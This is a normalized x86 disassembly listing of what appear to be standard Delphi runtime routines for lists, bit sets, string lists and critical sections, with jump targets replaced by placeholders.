dec ebx
jne r-xdata
sub_4167d4
push ebx
push esi
call sub_405e8c
mov eax [ eax + 0x8 ]
call sub_403164
call sub_405e8c
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_416c00
mov esi eax
call sub_405e8c
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_416a08
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405e8c
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403164
sub_416830
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4168c6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4168cd
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4030f0
call sub_416830
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030b4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404100
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40513c
call sub_40518c
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4166c8
or bl al
sub_4168d8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_416986
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_416967
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4030ac
call sub_416830
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41674c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41696e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4167a4
retn
call sub_4167d4
sub_41699a
add [ eax ] al
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4169bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416a08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416aa4
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_402930
mov edx esi
mov eax ebx
call sub_416b18
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416a6c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_416a68
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
jmp sub_4038d8
sub_416aa4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_416aec
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405c20
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_416a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416af3
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_416b18
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416aa4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_416b40
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_416c7c
retn
sub_416b74
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_416b94
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416aa4
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_402930
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416c0c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416aa4
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416c5c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_416b74
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416a08
sub_416c7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416aa4
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402774
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_416cb8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416aa4
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_416c7c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b78
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_416a08
dec ebp
inc edi
jne r-xdata
sub_416d2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_416d80
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034d8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416e84
xor eax eax
push ebp
push sub_416de2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403164
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416de9
mov eax [ ebp - 0x4 ]
call sub_416ee8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_416dfc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416e84
xor eax eax
push ebp
push sub_416e78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4169bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416b74
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e7f
mov eax [ ebp - 0x4 ]
call sub_416ee8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_416aa4
sub_416e98
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416e84
xor eax eax
push ebp
push sub_416edb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ee2
mov eax [ ebp - 0x4 ]
call sub_416ee8
retn
sub_416ef4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_416f48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_416f48
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_416f24
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_402734
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b78
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402754
mov edx edi
mov eax ebp
call sub_416f3c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_402930
sub_416fec
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_416f24
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_416f48
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_417018
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_417090
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_419788
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4170d0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417186
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f34
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030b4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404100
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030b4
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41718d
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_4171ac
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_417241
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030b4
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404100
mov eax ebx
mov si 0xffff
call sub_403360
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417248
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
mov si 0xffff
call sub_403360
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403360
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40421c
sub_417253
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4033a0
mov eax ebx
mov si 0xffff
call sub_403360
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403360
push eax
lea eax [ ebx + 0x4 ]
call sub_40575c
mov ecx eax
mov edx r-xdata
pop eax
call sub_403218
sub_41729e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4172f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403218
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_417318
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_417338
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417392
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_416c00
call sub_403164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4173a0
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_417ef8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417090
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4173d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4173f4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_417418
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4174bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417568
xor eax eax
push ebp
push sub_4174a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4174a9
mov eax [ ebp - 0x4 ]
call sub_417624
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4174d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4170bc
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_417568
xor eax eax
push ebp
push sub_417550
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417624
retn
sub_417580
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_417638
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4175d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_417d90
mov eax [ ebp - 0x8 ]
push eax
push sub_418040
push ebp
call sub_417580
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417638
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4176cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4176d4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403ec0
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4042a8
jne r-xdata
sub_4176e4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4176e0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
jmp sub_4038d8
sub_41771c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417764
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c20
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4176e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41776b
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_417774
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41784c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417568
xor eax eax
push ebp
push sub_41782a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417831
mov eax [ ebp - 0x4 ]
call sub_417624
retn
sub_417868
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4178ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40435c
call sub_4086b4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178b4
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_4178bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4179c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f34
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403f8c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179ce
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ec0
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40415c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40415c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40415c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_402930
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
